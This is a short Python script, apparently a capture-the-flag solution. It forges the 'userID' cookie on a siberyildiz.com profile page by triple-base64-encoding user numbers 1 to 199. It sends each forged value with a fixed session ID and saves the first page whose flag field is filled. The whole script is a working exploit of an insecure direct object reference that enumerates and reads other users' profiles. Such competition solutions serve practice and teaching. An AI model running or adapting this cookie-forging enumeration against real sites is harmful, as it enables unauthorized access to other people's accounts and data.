import requests, time as t, base64, urllib.parse 

def give(i):
    for z in range(3):
        encoded_bytes = base64.b64encode(str(i).encode("utf-8"))
        i = encoded_bytes.decode("utf-8")

    return urllib.parse.quote(i)

for i in range(1, 200):
    uid = give(i)
    print(uid)

    cookies = { "PHPSESSID": "v154fpcd6a5sad4tpuk7od0u5q", "userID": uid }

    response = requests.get("https://f0e4ec1891ff984e.siberyildiz.com/profile.php", cookies=cookies)

    if """ <input type="text" class="form-control" id="ad" name="flag"
                                        value="" disabled>""" not in response.text:
        print("Bulduk")
        print(response.text, file = open("flag.data", "w"), flush=True)
        break
    t.sleep(5)